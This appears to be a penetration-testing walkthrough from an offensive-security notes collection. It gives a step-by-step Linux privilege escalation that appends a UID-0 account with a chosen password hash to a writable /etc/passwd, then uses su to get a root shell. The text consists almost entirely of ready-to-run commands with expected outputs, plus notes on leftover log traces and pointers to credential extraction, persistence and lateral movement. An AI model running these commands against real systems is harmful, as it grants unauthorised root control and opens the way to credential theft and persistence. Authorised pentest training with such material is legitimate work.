
⚠️ **Hard preconditions — verified in Step 1.**

- **/etc/passwd is writable by the current user** on the target.
- **Non-destructive.** A new UID-0 user line is appended; existing entries (including the original `root`) are preserved. Cleanup at Step 6 removes the added line.
- **Injected username default: `sysadm`.** Substitute throughout if Step 1 reveals a collision or operator prefers a different name.

No external lookup needed — preconditions checked in Step 1 below.

---

## Step 1 — Preflight verification

### Confirm /etc/passwd is writable by current user:

`test -w /etc/passwd && echo "WRITABLE" || echo "NOT WRITABLE"`

- `WRITABLE` → proceed.
- `NOT WRITABLE` → walkthrough doesn't apply.

### Check for username collision (default `sysadm`):

`grep -q '^sysadm:' /etc/passwd && echo "COLLISION — pick different name" || echo "CLEAR"`

- `CLEAR` → proceed with `sysadm` in Steps 4–6.
- `COLLISION` → substitute a different name throughout Steps 4–6.

---

## Step 2 — Backup /etc/passwd

`install -m 600 /etc/passwd /tmp/.passwd.bak && echo "BACKUP CREATED" || echo "BACKUP FAILED"`

- `BACKUP CREATED` → restoration available at Step 6 cleanup. Proceed.
- `BACKUP FAILED` → unexpected on standard systems (disk full / /tmp not writable / unusual hardening); without backup, paste-typo recovery is unavailable. Investigate before proceeding.

---

## Step 3 — Generate replacement hash (on attacker)

`openssl passwd -6`

Enter chosen password at both prompts. Output line is the SHA-512 hash in the form `$6$<salt>$<hash>`.

Copy the entire hash string for Step 4.

---

## Step 4 — Append UID-0 user line to /etc/passwd (on target)

Single-quoted to keep the shell from interpreting `$` characters in the hash:

`echo 'sysadm:<hash_from_step_3>:0:0:root:/root:/bin/bash' >> /etc/passwd`

Replace `<hash_from_step_3>` with the openssl output verbatim.

Verify:

`grep '^sysadm:' /etc/passwd`

- Output shows `sysadm:$6$<salt>$<hash>:0:0:root:/root:/bin/bash` → proceed to Step 5.
- No output → append failed; re-check Step 1's `test -w` (write perm may have been revoked between check and append).
- Line present but mangled (no `$6$` prefix, truncated, fewer than six `:` separators) → shell interpreted the hash. Re-issue with single quotes intact.

---

## Step 5 — Elevate

`su - sysadm`

Enter the password chosen in Step 3.

**Use `id` (not `whoami`). Both show `root`, not `sysadm`** — name-lookup of UID 0 returns the first /etc/passwd match. `id`'s `uid=0` field is the success criterion; the name in parentheses is cosmetic.

`id`

- Output shows `uid=0(...)` → root authority achieved. Proceed to Step 6.
- "Authentication failure" → hash insertion mangled the line, or password mistyped. Re-verify Step 4's grep output character-for-character against the Step 3 openssl output.
- `su` rejects with "su: must be run from a terminal" → not in a real TTY; see [[Reverse Shell Stabilization]].

---

## Step 6 — Cleanup

From the root shell:

`test -f /tmp/.passwd.bak && cp /tmp/.passwd.bak /etc/passwd && rm /tmp/.passwd.bak && echo "RESTORED, BACKUP REMOVED" || echo "NO BACKUP"`

- `RESTORED, BACKUP REMOVED` → /etc/passwd restored. `sysadm` account removed; sysadm credentials no longer valid; current root shell remains active.
- `NO BACKUP` → Step 2 backup absent (proceeded past BACKUP FAILED). Surgical removal: `sed -i '/^sysadm:/d' /etc/passwd`.

⚠️ `auth.log` retains the `su - sysadm` attempt; `~/.bash_history` retains command invocations. Log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

